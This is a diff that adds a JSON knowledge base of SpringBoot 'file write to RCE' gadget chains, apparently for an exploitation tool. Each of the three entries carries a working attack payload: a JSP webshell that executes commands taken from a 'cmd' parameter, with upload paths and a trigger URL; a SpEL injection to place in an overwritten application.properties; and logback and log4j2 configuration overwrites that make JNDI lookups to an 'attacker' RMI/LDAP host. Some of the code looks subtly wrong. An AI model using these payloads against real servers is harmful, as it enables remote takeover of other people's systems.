@@ -1,0 +1,162 @@
+{
+  "_comment": "SpringBoot 任意文件写到 RCE 额外 Gadget Chains",
+  "_reference": "基于 h3rmesk1t 和 LandGrey 的研究",
+  "gadget_chains": [
+    {
+      "id": "CHAIN-SPRINGBOOT-001",
+      "name": "SpringBoot JSP Webshell 上传",
+      "aliases": ["SpringBootFileWrite"],
+      "description": "通过任意文件写上传JSP Webshell实现RCE。适用于SpringBoot War部署场景。检测可写目录如/webapps/ROOT/、/static/等，上传JSP文件后直接访问执行命令。",
+      "dependencies": [
+        {
+          "group_id": "org.aspectj",
+          "artifact_id": "aspectjweaver",
+          "version": null,
+          "version_constraint": "!=1.9.4",
+          "_inference": {
+            "confidence": "high",
+            "method": "springboot_webshell_upload"
+          }
+        }
+      ],
+      "tags": [
+        "FileWrite",
+        "RCE",
+        "WebshellUpload",
+        "SpringBoot"
+      ],
+      "jdk_version": "any",
+      "gadget_class": "AspectJWeaverWebshell",
+      "rce_paths": [
+        {
+          "path_name": "JSP Webshell Upload",
+          "description": "上传JSP Webshell到可访问目录",
+          "target_directories": [
+            "/webapps/ROOT/shell.jsp",
+            "/webapps/app/cmd.jsp",
+            "/static/shell.jsp",
+            "/upload/shell.jsp"
+          ],
+          "jsp_payload": "<%@ page import=\"java.io.*\" %><%=Runtime.exec(request.getParameter(\"cmd\"))%>",
+          "trigger": "访问 http://target/shell.jsp?cmd=whoami"
+        }
+      ],
+      "pre_tags": [
+        "JavaNativeDeserialize"
+      ],
+      "next_tags": [
+        "WebshellAccess"
+      ]
+    },
+    {
+      "id": "CHAIN-SPRINGBOOT-002",
+      "name": "Spring配置文件覆盖SpEL注入",
+      "aliases": ["SpringConfigSpEL"],
+      "description": "覆盖Spring配置文件(application.properties/yml)实现SpEL注入。通过恶意配置注入SpEL表达式实现RCE。适用于SpringBoot场景。",
+      "dependencies": [
+        {
+          "group_id": "org.aspectj",
+          "artifact_id": "aspectjweaver",
+          "version": null,
+          "version_constraint": "!=1.9.4",
+          "_inference": {
+            "confidence": "high",
+            "method": "spring_config_spel_injection"
+          }
+        },
+        {
+          "group_id": "org.springframework.boot",
+          "artifact_id": "spring-boot",
+          "version": null,
+          "version_constraint": null,
+          "_inference": {
+            "confidence": "medium",
+            "method": "spring_context_required"
+          }
+        }
+      ],
+      "tags": [
+        "FileWrite",
+        "RCE",
+        "SpELInjection",
+        "SpringBoot"
+      ],
+      "jdk_version": "any",
+      "gadget_class": "SpringConfigSpELInjection",
+      "rce_paths": [
+        {
+          "path_name": "application.properties 覆盖",
+          "description": "覆盖application.properties注入恶意配置",
+          "target_files": [
+            "application.properties",
+            "application.yml",
+            "bootstrap.properties",
+            "bootstrap.yml"
+          ],
+          "payload": "logging.file.name=../../tmp/shell.jsp\nlogging.pattern.console=${T(java.lang.Runtime).getRuntime().exec('calc.exe')}",
+          "trigger": "触发日志记录或应用重启"
+        }
+      ],
+      "pre_tags": [
+        "JavaNativeDeserialize"
+      ],
+      "next_tags": [
+        "SpELExecution"
+      ]
+    },
+    {
+      "id": "CHAIN-SPRINGBOOT-003",
+      "name": "日志配置文件覆盖注入",
+      "aliases": ["LogConfigInjection"],
+      "description": "覆盖日志配置文件(logback.xml/log4j2.xml)实现代码注入。通过恶意日志配置实现RCE。适用于Logback/Log4j2场景。",
+      "dependencies": [
+        {
+          "group_id": "org.aspectj",
+          "artifact_id": "aspectjweaver",
+          "version": null,
+          "version_constraint": "!=1.9.4",
+          "_inference": {
+            "confidence": "high",
+            "method": "log_config_injection"
+          }
+        }
+      ],
+      "tags": [
+        "FileWrite",
+        "RCE",
+        "LogInjection",
+        "SpringBoot"
+      ],
+      "jdk_version": "any",
+      "gadget_class": "LogConfigInjection",
+      "rce_paths": [
+        {
+          "path_name": "logback.xml 覆盖",
+          "description": "覆盖logback.xml注入恶意配置",
+          "target_files": [
+            "logback.xml",
+            "logback-spring.xml"
+          ],
+          "payload": "<configuration><insertFromJNDI env-context-name=\"xxx\" as=\"rmi://attacker:1099/exploit\"/></configuration>",
+          "trigger": "触发日志记录"
+        },
+        {
+          "path_name": "log4j2.xml 覆盖",
+          "description": "覆盖log4j2.xml注入恶意配置",
+          "target_files": [
+            "log4j2.xml",
+            "log4j2-spring.xml"
+          ],
+          "payload": "<?xml version=\"1.0\"?><Configuration><Appenders><JDBC name=\"database\" tableName=\"logs\"><DataSource jndiName=\"ldap://attacker:1099/exploit\"/></JDBC></Appenders></Configuration>",
+          "trigger": "触发日志记录"
+        }
+      ],
+      "pre_tags": [
+        "JavaNativeDeserialize"
+      ],
+      "next_tags": [
+        "LogInjection"
+      ]
+    }
+  ]
+}
